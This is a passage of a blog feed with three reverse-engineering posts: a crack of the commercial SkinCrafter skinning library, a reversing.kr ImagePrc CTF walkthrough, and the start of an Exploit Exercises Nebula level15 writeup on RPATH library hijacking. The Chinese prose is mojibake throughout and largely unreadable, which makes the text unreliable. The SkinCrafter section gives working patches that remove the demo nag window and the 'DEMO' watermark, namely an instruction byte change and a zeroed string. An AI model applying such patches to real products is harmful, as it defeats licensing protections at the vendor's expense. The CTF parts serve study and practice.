&lt;pre&gt;&lt;code class="x86asm"&gt;10012B40  /$  55            push ebp
10012B41  |.  8BEC          mov ebp,esp
10012B43  |.  833D D45F0710&amp;gt;cmp dword ptr ds:[0x10075FD4],0x0
10012B4A  |.  56            push esi
10012B4B  |.  8BF1          mov esi,ecx
10012B4D  |.  75 42         jnz XSkinCraf.10012B91
10012B4F  |.  8B0D DC5F0710 mov ecx,dword ptr ds:[0x10075FDC]
10012B55  |.  6A 05         push 0x5
10012B57  |.  E8 22480400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B5C  |.  8B0D DC5F0710 mov ecx,dword ptr ds:[0x10075FDC]
10012B62  |.  6A 00         push 0x0
10012B64  |.  6A 08         push 0x8
10012B66  |.  6A 00         push 0x0
10012B68  |.  E8 8B490400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ModifyStyle_7889&amp;gt;
10012B6D  |.  8B0D E05F0710 mov ecx,dword ptr ds:[0x10075FE0]
10012B73  |.  6A 05         push 0x5
10012B75  |.  E8 04480400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B7A  |.  8B0D E45F0710 mov ecx,dword ptr ds:[0x10075FE4]
10012B80  |.  6A 05         push 0x5
10012B82  |.  E8 F7470400   call &amp;lt;jmp.&amp;amp;mfc100.#CWnd::ShowWindow_12962&amp;gt;
10012B87  |.  C705 D45F0710&amp;gt;mov dword ptr ds:[0x10075FD4],0x1
10012B91  |&amp;gt;  8B46 18       mov eax,dword ptr ds:[esi+0x18]
10012B94  |.  85C0          test eax,eax
10012B96  |.  74 74         je XSkinCraf.10012C0C
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ç›´æ¥åœ¨ODçš„Nameè¡¨ä¸­æ‰¾å‡ºMFCçš„CWnd::ShowWindowå‡½æ•°è°ƒç”¨å¤„å…¨éƒ¨ä¸‹æ–­ï¼Œæ­¤å¤„è¿ç»­å‡ºç°3å¤„ShowWindow()ï¼Œå°†ç¬¬ä¸€æ¬¡å‡ºç°å¤„çš„&lt;code&gt;push 0x5&lt;/code&gt;æ”¹æˆ&lt;code&gt;push 0x0&lt;/code&gt;å³å¯ã€‚&lt;/p&gt;
&lt;h1&gt;å»é™¤æ ‡é¢˜æ DEMOå­—æ ·&lt;/h1&gt;
&lt;p&gt;æœ¬ä»¥ä¸ºè¿™æ­¥ä¼šå¾ˆç®€å•ï¼Œå¾ˆå¯æƒœï¼Œä½ä¼°äº†ä½œè€…çš„æ™ºå•†ã€‚ç›´æ¥æ‰¾å­—ç¬¦ä¸²æ²¡çœ‹åˆ°SkinCrafter Demoå­—æ ·ï¼Œå› æ­¤æ€€ç–‘å¾ˆå¯èƒ½å­—ç¬¦ä¸²æ˜¯è¢«åŠ å¯†çš„äº†ã€‚ODè°ƒè¯•Dllä¼šåŠ è½½LoadDll.exeè¿™ä¸ªç¨‹åºï¼Œå¹¶åœ¨DllåŠ è½½åå…è®¸é€šè¿‡æ¥å£æ‰§è¡ŒDllçš„å¯¼å‡ºå‡½æ•°ï¼Œå¯¹äºä¸€èˆ¬ä½œä¸ºå‡½æ•°åº“çš„Dllè¿™æ ·è°ƒè¯•å½“ç„¶æ²¡é—®é¢˜ï¼Œæ¯ä¸ªå‡½æ•°éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œä½†æ˜¯å¯¹äºè¿™ç§å‡½æ•°ä¹‹é—´æœ‰æ•°æ®ä¾èµ–çš„Dllæ¥è¯´ï¼Œæˆ‘å¿…é¡»å…ˆè°ƒç”¨å‡ ä¸ªä¾èµ–çš„å‡½æ•°ï¼Œè¿™æ ·å°±è¿‡äºéº»çƒ¦äº†ï¼ˆä¸»è¦æ‡’å¾—è¾“é‚£ä¹ˆé•¿çš„å‚æ•°ï¼Œè¿˜è¦å°ç«¯ç ï¼Œè€Œä¸”æ¯æ¬¡åŠ è½½éƒ½è¦è¾“å…¥â€¦â€¦ï¼‰ã€‚è¿™é‡Œå°±ç”¨åˆ°ä¸€ä¸ªæŠ€å·§ï¼Œè‡ªå·±å†™ä¸€ä¸ªè°ƒç”¨dllçš„exeï¼Œç›´æ¥è°ƒè¯•exeï¼Œå¹¶è¿›å…¥Dllçš„é¢†ç©ºæ‰¾éœ€è¦çš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ODçš„è°ƒè¯•é€‰é¡¹ä¸­ï¼Œæ‰¾åˆ°äº‹ä»¶(Event)é€‰é¡¹å¡ï¼ŒæŠŠâ€œä¸­æ–­äºæ–°æ¨¡å—â€è¿™é¡¹å‹¾ä¸Šï¼Œä¹‹ååŠ è½½exeç¨‹åºã€‚æ¯å½“exeåŠ è½½ä¸€ä¸ªdllçš„æ—¶å€™ï¼Œå°±ä¼šè¢«æ–­ä¸‹ï¼ŒF9ç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°ç›®æ ‡å‡ºç°ã€‚å½“ç„¶SkinCrafterDllè¿™ä¸ªDllæ˜¯åœ¨ç¨‹åºä¸­é€šè¿‡LoadLibrary()åŠ è½½çš„ï¼Œå› æ­¤å…ˆè¦æŠŠç¨‹åºè·‘èµ·æ¥ã€‚&lt;/p&gt;
&lt;p&gt;æ–­ä¸‹åè¿›å…¥è¯¥Dllé¢†ç©ºï¼Œå¹¶æŸ¥çœ‹æ‰€æœ‰å‡½æ•°ç¬¦å·ã€‚è€ƒè™‘åˆ°å’Œç»˜å›¾æœ‰å…³ï¼Œå¹¶ç»è¿‡å‡ æ¬¡å®éªŒï¼Œæœ€åå®šä½åœ¨GdiPlusåº“ä¸­çš„GdipDrawString()å‡½æ•°ä¸Šï¼Œç›´æ¥ä¸‹æ–­å‡½æ•°ã€‚ä½†æ˜¯æŸ¥æ‰¾å‡½æ•°å¼•ç”¨çš„æ—¶å€™å´æ²¡æœ‰ç»“æœï¼Œè¿™æ˜¯å› ä¸ºDllåˆšå¼€å§‹å¹¶æ²¡æœ‰å¡«å……IATï¼Œæ‰€ä»¥éœ€è¦å†ç»§ç»­F9ï¼Œç›´åˆ°IATåˆå§‹åŒ–å®Œæ¯•ã€‚å†æŸ¥æ‰¾å¼•ç”¨å°±å¯ä»¥æ‰¾åˆ°å‡½æ•°è°ƒç”¨å¤„äº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
02E01511  |.  53            push ebx                                             ; /hIcon
02E01512  |.  FF15 0034E102 call dword ptr ds:[&amp;lt;&amp;amp;USER32.DestroyIcon&amp;gt;]            ; \DestroyIcon
02E01518  |&amp;gt;  8B9D 54FFFFFF mov ebx,[local.43]
02E0151E  |&amp;gt;  A1 406CE102   mov eax,dword ptr ds:[0x2E16C40]
02E01523  |.  8B15 3C6CE102 mov edx,dword ptr ds:[0x2E16C3C]
02E01529  |.  8B0D 446CE102 mov ecx,dword ptr ds:[0x2E16C44]
02E0152F  |.  8945 E0       mov [local.8],eax
02E01532  |.  66:A1 4C6CE10&amp;gt;mov ax,word ptr ds:[0x2E16C4C]
02E01538  |.  8955 DC       mov [local.9],edx
02E0153B  |.  8B15 486CE102 mov edx,dword ptr ds:[0x2E16C48]
02E01541  |.  66:8945 EC    mov word ptr ss:[ebp-0x14],ax
02E01545  |.  8D45 DC       lea eax,[local.9]
02E01548  |.  894D E4       mov [local.7],ecx
02E0154B  |.  8955 E8       mov [local.6],edx
02E0154E  |.  33C9          xor ecx,ecx
02E01550  |.  8D70 01       lea esi,dword ptr ds:[eax+0x1]
...
02E017E5  |.  8B8D 64FFFFFF mov ecx,[local.39]
02E017EB  |.  56            push esi
02E017EC  |.  51            push ecx
02E017ED  |.  8B8D 48FFFFFF mov ecx,[local.46]
02E017F3  |.  8D95 F8FEFFFF lea edx,[local.66]
02E017F9  |.  52            push edx
02E017FA  |.  8B95 6CFFFFFF mov edx,[local.37]
02E01800  |.  51            push ecx
02E01801  |.  6A FF         push -0x1
02E01803  |.  50            push eax
02E01804  |.  52            push edx
02E01805  |.  E8 D26D0000   call &amp;lt;jmp.&amp;amp;gdiplus.GdipDrawString&amp;gt;
02E0180A  |.  8B85 64FFFFFF mov eax,[local.39]
02E01810  |.  50            push eax
02E01811  |.  E8 846D0000   call &amp;lt;jmp.&amp;amp;gdiplus.GdipDeleteStringFormat&amp;gt;
02E01816  |.  56            push esi
02E01817  |.  E8 A66C0000   call &amp;lt;jmp.&amp;amp;gdiplus.GdipDeleteBrush&amp;gt;
02E0181C  |.  8B8D 48FFFFFF mov ecx,[local.46]
02E01822  |.  51            push ecx
02E01823  |.  E8 906D0000   call &amp;lt;jmp.&amp;amp;gdiplus.GdipDeleteFont&amp;gt;
02E01828  |.  8B95 6CFFFFFF mov edx,[local.37]
02E0182E  |.  52            push edx
02E0182F  |.  C645 FC 01    mov byte ptr ss:[ebp-0x4],0x1
02E01833  |.  E8 906C0000   call &amp;lt;jmp.&amp;amp;gdiplus.GdipDeleteGraphics&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç»è¿‡è·Ÿè¸ªï¼Œå¯ä»¥å‘ç°å­—ç¬¦ä¸²åœ¨DestroyIcon()æ‰§è¡Œä¹‹åè¢«è£…å…¥ï¼Œåœ¨å†…å­˜ä¸­æ˜¾ç¤ºä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-hightlight"&gt;02E16C38  80 0F E0 02 54 6C 6E 69 44 75 66 61 73 62 75 27  â‚¬?TlniDufasbu'
02E16C48  43 62 6A 68 27 00 00 00 E4 D9 E1 02 A0 2B E0 02  Cbjh'...æ»Ÿ???
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å› æ­¤å­—ç¬¦ä¸²ä¸ºTlniDufasbu'Cbjh'ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç»è¿‡åé¢çš„ç®—æ³•è½¬æ¢æˆäº†SkinCrafter Demoï¼Œå› æ­¤åªè¦ç›´æ¥å¹²æ‰å­—ç¬¦ä¸²å°±å¯ä»¥ï¼Œæˆ–è€…nopæ‰GdipDrawString()ã€‚æˆ‘é‡‡ç”¨åˆ æ‰å­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€dllæ‰¾åˆ°è¿™ä¸ªå­—ç¬¦ä¸²å¹¶å¡«0ã€‚&lt;/p&gt;
&lt;h1&gt;åè®°&lt;/h1&gt;
&lt;p&gt;ä»æˆ‘ä½¿ç”¨çš„æƒ…å†µæ¥çœ‹æš‚æ—¶æ²¡æœ‰å‡ºç°å…¶ä»–é—®é¢˜ï¼Œå¦‚æœæœ‰ç ´è§£ä¸å®Œå…¨æˆ–é€ æˆé”™è¯¯çš„åœ°æ–¹ï¼Œæˆ‘ä¼šåœ¨åç»­åšå‡ºå®Œå–„ã€‚å¦å¤–ï¼Œæ­¤æ¬¡è°ƒè¯•è¿‡ç¨‹ä¸­å…¨ç¨‹åœ¨IDAä¸­åŒæ­¥å‚è€ƒï¼ŒIDAçš„å›¾å½¢è§†å›¾èƒ½å¾ˆå¥½çš„çœ‹å‡ºç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œå½“ç„¶IDAè¿˜æœ‰ä¸‡æ¶çš„F5å¤§æ€å™¨ :P&lt;/p&gt;</summary><category term="SkinCrafter"></category><category term="crack"></category><category term="reversing"></category></entry><entry><title>reversing.kr ImagePrc Walkthrough</title><link href="http://blog.yyx.name/posts/reversing-kr-imageprc.html" rel="alternate"></link><updated>2014-09-23T18:05:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-23:posts/reversing-kr-imageprc.html</id><summary type="html">&lt;h1&gt;è¯•ç©&lt;/h1&gt;
&lt;p&gt;çœ‹èµ·æ¥å¾ˆæœ‰æ„æ€çš„ä¸€é“é¢˜ç›®ã€‚æ‹¿åˆ°åæ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œå¯ä»¥ç”¨é¼ æ ‡ç”»ä¸€äº›ä¸œè¥¿ï¼Œä¹‹åç‚¹Checkï¼Œå¼¹å‡ºâ€œWrongâ€ã€‚ç›´è§‰è®¤ä¸ºåº”è¯¥æ˜¯è¦ç”»å‡ºä¸€ä¸ªå›¾åƒï¼Œæ­£ç¡®çš„è¯ä¼šå¾—åˆ°flagã€‚å¯æƒœè¿™ä¸ªå›¾èƒ½ç”»æ­£ç¡®çš„æ¦‚ç‡çœŸçš„å¾ˆä½ã€‚&lt;/p&gt;
&lt;h1&gt;é€»è¾‘åˆ†æ&lt;/h1&gt;
&lt;p&gt;ODæ‰“å¼€ä¹‹åä¸‹MessageBoxAçš„APIæ–­ç‚¹æˆ–è€…WM_LBUTTONUPçš„æ¶ˆæ¯æ–­ç‚¹ï¼Œç‚¹å‡»Checkåæ–­ä¸‹å¹¶è·Ÿè¸ªåˆ°æ ¸å¿ƒé€»è¾‘ä»£ç çš„ä½ç½®ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004012D6   &amp;gt; \83BC24 940000&amp;gt;cmp dword ptr ss:[esp+0x94],0x64         ;  Case 111 (WM_COMMAND) of switch 0040113A
004012DE   .  0F85 01020000 jnz ImagePrc.004014E5
...
004013CD   &amp;gt;  8B8424 900000&amp;gt;mov eax,dword ptr ss:[esp+0x90]
004013D4   .  6A 30         push 0x30                                ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL
004013D6   .  68 34604000   push ImagePrc.00406034                   ; |ImagePrc
004013DB   .  68 40604000   push ImagePrc.00406040                   ; |Wrong
004013E0   .  50            push eax                                 ; |hOwner
004013E1   .  FF15 F8504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
004013E7   .  56            push esi
004013E8   .  E8 13010000   call ImagePrc.00401500
004013ED   .  83C4 04       add esp,0x4
004013F0   .  33C0          xor eax,eax
004013F2   .  5B            pop ebx
004013F3   .  5F            pop edi
004013F4   .  5E            pop esi
004013F5   .  81C4 80000000 add esp,0x80
004013FB   .  C2 1000       retn 0x10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åœ¨æŒ‰é’®æ¶ˆæ¯è·¯ç”±åˆ°å¼¹å‡ºæ¶ˆæ¯æ¡†ä¹‹é—´å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„æ ¸å¿ƒé€»è¾‘ã€‚ä¸‹é¢åˆ†è§£ä¸€ä¸‹é€»è¾‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
004012E4   .  A1 F4844000   mov eax,dword ptr ds:[0x4084F4]
004012E9   .  8D5424 08     lea edx,dword ptr ss:[esp+0x8]
004012ED   .  53            push ebx
004012EE   .  52            push edx                                 ; /Buffer = 0018FB04
004012EF   .  6A 18         push 0x18                                ; |BufSize = 18 (24.)
004012F1   .  50            push eax                                 ; |hObject =&amp;gt; B9051E9B
004012F2   .  FF15 1C504000 call dword ptr ds:[&amp;lt;&amp;amp;GDI32.GetObjectA&amp;gt;]  ; \GetObjectA
004012F8   .  B9 0A000000   mov ecx,0xA
004012FD   .  33C0          xor eax,eax
004012FF   .  8D7C24 24     lea edi,dword ptr ss:[esp+0x24]
00401303   .  8D5424 24     lea edx,dword ptr ss:[esp+0x24]
00401307   .  F3:AB         rep stos dword ptr es:[edi]
00401309   .  8B4424 14     mov eax,dword ptr ss:[esp+0x14]
0040130D   .  8B4C24 10     mov ecx,dword ptr ss:[esp+0x10]
00401311   .  8B3D 20504000 mov edi,dword ptr ds:[&amp;lt;&amp;amp;GDI32.GetDIBits&amp;gt;&amp;gt;;  GDI32.GetDIBits
00401317   .  6A 00         push 0x0                                 ; /Usage = DIB_RGB_COLORS
00401319   .  52            push edx                                 ; |pBitmapinfo
0040131A   .  6A 00         push 0x0                                 ; |Buffer = NULL
0040131C   .  894424 38     mov dword ptr ss:[esp+0x38],eax          ; |
00401320   .  50            push eax                                 ; |nLines
00401321   .  A1 F4844000   mov eax,dword ptr ds:[0x4084F4]          ; |
00401326   .  894C24 38     mov dword ptr ss:[esp+0x38],ecx          ; |
0040132A   .  8B0D DC844000 mov ecx,dword ptr ds:[0x4084DC]          ; |
00401330   .  6A 00         push 0x0                                 ; |StartLine = 0
00401332   .  50            push eax                                 ; |hBitmap =&amp;gt; B9051E9B
00401333   .  51            push ecx                                 ; |hDC =&amp;gt; 4C01191B
00401334   .  C74424 40 280&amp;gt;mov dword ptr ss:[esp+0x40],0x28         ; |
0040133C   .  66:C74424 4C &amp;gt;mov word ptr ss:[esp+0x4C],0x1           ; |
00401343   .  66:C74424 4E &amp;gt;mov word ptr ss:[esp+0x4E],0x18          ; |
0040134A   .  C74424 50 000&amp;gt;mov dword ptr ss:[esp+0x50],0x0          ; |
00401352   .  FFD7          call edi                                 ; \GetDIBits
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç¨‹åºé¦–å…ˆè·å–ç»˜åˆ¶çš„å¯¹è±¡ï¼Œå¹¶æå–ç»˜åˆ¶å¯¹è±¡çš„åƒç´ å†…å®¹ã€‚åœ¨&lt;code&gt;GetDIBits()&lt;/code&gt;çš„æ—¶å€™æ ˆæƒ…å†µå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
0018FADC   4C01191B  |hDC = 4C01191B
0018FAE0   B9051E9B  |hBitmap = B9051E9B
0018FAE4   00000000  |StartLine = 0
0018FAE8   00000096  |nLines = 96 (150.)
0018FAEC   00000000  |Buffer = NULL
0018FAF0   0018FB1C  |pBitmapinfo = 0018FB1C
0018FAF4   00000000  \Usage = DIB_RGB_COLORS
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°å›¾åƒä¸ºRGBå›¾åƒï¼Œç¬¬ä¸€ä¸ªæ‰«æçº¿æ˜¯150ï¼ˆå…¶å®å°±æ˜¯150çš„é«˜åº¦ï¼‰ã€‚æŸ¥çœ‹åœ°å€0018FB1Cå¤„æ•°æ®çš„LPBITMAPINFOç»“æ„ä½“æŒ‡é’ˆçš„å†…å®¹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="ascii"&gt;...
0018FB1C  28 00 00 00 C8 00 00 00 96 00 00 00 01 00 18 00  (.Ãˆ.Â–.
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ ¹æ®BITMAPINFOç»“æ„ä½“æ ¼å¼ï¼Œå‘ç°bitmapçš„é•¿åº¦æ˜¯0xC8ï¼Œé«˜åº¦0x96ï¼Œå³200x150å¤§å°ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ç€å¾€ä¸‹çœ‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
00401381   .  6A 18         push 0x18                                ; /ResourceType = 18
00401383   .  6A 65         push 0x65                                ; |ResourceName = 65
00401385   .  6A 00         push 0x0                                 ; |hModule = NULL
00401387   .  FF15 7C504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.FindResour&amp;gt;; \FindResourceA
0040138D   .  50            push eax                                 ; /hResource
0040138E   .  6A 00         push 0x0                                 ; |hModule = NULL
00401390   .  FF15 80504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LoadResour&amp;gt;; \LoadResource
00401396   .  50            push eax                                 ; /hResource
00401397   .  FF15 88504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LockResour&amp;gt;; \LockResource
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åç¨‹åºä»è‡ªèº«è·å–èµ„æºç¼–å·ä¸º0x65ã€ç±»å‹æ˜¯0x18çš„èµ„æºå¹¶åŠ è½½ã€‚è¿™é‡Œæä¸€å¥ï¼Œ&lt;code&gt;FindResource()&lt;/code&gt;è¿”å›çš„eaxæŒ‡å‘çš„æ•°æ®åŒºæ„é€ å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="ascii"&gt;0047E048  60 E0 07 00 90 5F 01 00 00 00 00 00 00 00 00 00  î å¾....
0047E058  00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF  ........
0047E068  FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ........
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ç¬¬0-4ä¸ªå­—èŠ‚0x0007E060æ˜¯èµ„æºçœŸæ­£çš„èµ·å§‹åœ°å€çš„åç§»ï¼Œ5-8ä¸ªå­—èŠ‚0x00105F90æ˜¯èµ„æºå¤§å°ï¼Œ0047E060æ‰æ˜¯èµ„æºæ•°æ®å†…å®¹çš„èµ·å§‹ã€‚è¿™å°±æ˜¯PEæ–‡ä»¶å¯¹äºèµ„æºçš„å¸ƒå±€ï¼ˆå½“ç„¶ä¸çŸ¥é“ä¹Ÿèƒ½è§£é¢˜ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LoadResource()&lt;/code&gt;å¹¶Lockä¹‹åï¼Œè¿›å…¥å¦‚ä¸‹é€»è¾‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
0040139D   .  33FF          xor edi,edi
0040139F   .  8BCE          mov ecx,esi
004013A1   .  2BC6          sub eax,esi
004013A3   &amp;gt;  8A11          mov dl,byte ptr ds:[ecx]
004013A5   .  8A1C08        mov bl,byte ptr ds:[eax+ecx]
004013A8   .  3AD3          cmp dl,bl
004013AA      75 21         jnz XImagePrc.004013CD
004013AC   .  47            inc edi
004013AD   .  41            inc ecx
004013AE      81FF 905F0100 cmp edi,0x15F90
004013B4   .^ 7C ED         jl XImagePrc.004013A3
004013B6   .  56            push esi
004013B7   .  E8 44010000   call ImagePrc.00401500
004013BC   .  83C4 04       add esp,0x4
004013BF   .  33C0          xor eax,eax
004013C1   .  5B            pop ebx
004013C2   .  5F            pop edi
004013C3   .  5E            pop esi
004013C4   .  81C4 80000000 add esp,0x80
004013CA &amp;gt; .  C2 1000       retn 0x10
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ®µé€»è¾‘å¾ˆç®€å•ï¼Œä¸€ä¸ªå¾ªç¯ï¼Œä¸€å…±å¾ªç¯0x15F90æ¬¡ï¼ˆåˆšå¥½æ˜¯ä¸Šé¢åˆ†æçš„èµ„æºçš„å¤§å°ï¼‰ã€‚ä¹‹åæŠŠç»˜åˆ¶çš„å›¾åƒæ•°æ®å’Œèµ„æºå›¾åƒæ•°æ®åˆ†åˆ«æ”¾å…¥dlå’Œblè¿›è¡Œæ¯ä¸ªbyteçš„é€ä¸€æ¯”è¾ƒã€‚ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºåªè¦æ¯”è¾ƒç»“æœæ­£ç¡®å°±èƒ½æ‹¿åˆ°flagï¼Œæ‰€ä»¥ç›´æ¥ä¿®æ”¹æ¯”è¾ƒæ¬¡æ•°ä¸º0ï¼Œå¯æƒœç¨‹åºæ­£å¸¸æ‰§è¡Œï¼Œå´æ²¡æœ‰flagçš„è¸ªè¿¹ã€‚æ‰€ä»¥æ€è·¯è½¬ä¸ºä»èµ„æºå…¥æ‰‹ã€‚&lt;/p&gt;
&lt;h1&gt;èµ„æºæ“ä½œ&lt;/h1&gt;
&lt;p&gt;æ‰“å¼€exeScopeä¹‹ç±»çš„èµ„æºæå–å·¥å…·ï¼Œæå–ç¼–å·0x65çš„èµ„æºï¼Œå‘ç°å¤§å°æ˜¯0X15F80ï¼Œæ¯”æˆ‘ä»¬éœ€è¦çš„æ•°æ®å°0x10ä¸ªå­—èŠ‚ã€‚äºæ˜¯é‡æ–°è·Ÿç¨‹åºåˆ°&lt;code&gt;LoadResource()&lt;/code&gt;æ‰§è¡Œåï¼Œeaxä¸º47e060ï¼Œæå–47e060-493ff0ä¸€å…±0X15F90å­—èŠ‚æ‰€æœ‰æ•°æ®åˆ°æ–‡ä»¶ã€‚å‘ç°å…¶å®æœ€å0x10ä¸ªå­—èŠ‚ç›´æ¥è¢«å¡«å……ä¸ºå…¨0ã€‚&lt;/p&gt;
&lt;p&gt;äºŒè¿›åˆ¶æ–‡ä»¶æå–å‡ºæ¥åï¼Œéœ€è¦è®©å®ƒä½œä¸ºå›¾åƒæ˜¾ç¤ºå‡ºæ¥ã€‚æ–‡ä»¶å¤§å°ä¸º0X15F90ï¼Œåè¿›åˆ¶æ˜¯90000ï¼Œç›¸å½“äº200x150x3ï¼Œä¹Ÿå°±æ˜¯200x150çš„RGBä¸‰é€šé“å›¾åƒã€‚æˆ‘è¿™è¾¹ç›´æ¥åˆ©ç”¨Pythonçš„&lt;a href="https://github.com/python-pillow/Pillow/"&gt;Pillowå›¾åƒå¤„ç†åº“&lt;/a&gt;åšè¿˜åŸï¼ˆPython3çš„PILä¸ºPillowï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;from PIL import Image

width = 200
height = 150

fp = open('rgb.mem', 'rb')
data = fp.read()
im = Image.frombytes('RGB', (width, height), data)
im = im.transpose(Image.FLIP_TOP_BOTTOM)
im.show()
im.save('result.bmp')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æå–åå‘ç°å›¾ç‰‡æ˜¯ä¸Šä¸‹é¢ å€’çš„ï¼Œä¸çŸ¥é“æ˜¯ç”±äºä½œè€…æ•…æ„åšæˆé¢ å€’çš„è¿˜æ˜¯WinAPIä¸­GetDIBitsæ˜¯å€’ç€è¯»çš„ã€‚æ‰€ä»¥ä½¿ç”¨&lt;code&gt;transpose()&lt;/code&gt;åšç¿»è½¬ã€‚ä¹‹åå¯ä»¥çœ‹åˆ°ä½œè€…ç»˜åˆ¶çš„å†…å®¹ä¸ºGOTä¸‰ä¸ªå­—ç¬¦ï¼Œå³ä¸ºflagã€‚&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level15-19 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-15-19.html" rel="alternate"></link><updated>2014-09-17T16:02:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-17:posts/exploit-exercises-nebula-level-15-19.html</id><summary type="html">&lt;h1&gt;Nebula level15&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.&lt;/p&gt;
&lt;p&gt;You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.&lt;/p&gt;
&lt;p&gt;Clean up after yourself :)&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨straceæŸ¥çœ‹flag15ï¼Œçœ‹æ˜¯å¦èƒ½å‘ç°å¼‚å¸¸ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç›´æ¥straceä¸€ä¸‹flag15ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level15@nebula:/home/flag15$ strace ./flag15
...
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7769000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbf977ab4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbf977ab4) = -1 ENOENT (No such file or directory)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹è§ç¨‹åºå¤§é‡è°ƒç”¨äº†libc.so.6ï¼Œä½†æ˜¯libc.so.6æœ¬èº«å´ä¸å­˜åœ¨ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;readelf&lt;/code&gt;å‘½ä»¤å‘ç°flag15å¯¹äºlibc.so.6å­˜åœ¨ä¾èµ–ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å› æ­¤æˆ‘ä»¬éœ€è¦å†™libc.so.6ï¼Œå¹¶æ”¾åˆ°&lt;code&gt;/var/tmp/flag15&lt;/code&gt;è·¯å¾„ä¸‹ï¼Œè®©.soçš„å‡½æ•°ç›´æ¥å»getflagã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢å°±æ˜¯ä»å“ªä¸ªå‡½æ•°ä¸‹æ‰‹çš„é—®é¢˜ï¼šæœ€æ–¹ä¾¿çš„è«è¿‡äºé‚£äº›è‡ªåŠ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œæ¯”å¦‚å…±äº«åº“æœ¬èº«åŠ è½½æ—¶å€™éœ€è¦æ‰§è¡Œçš„å‡½æ•°ï¼ŒGoogleåæ‰¾åˆ°è¿™å‡ ä¸ªï¼š&lt;/p&gt;
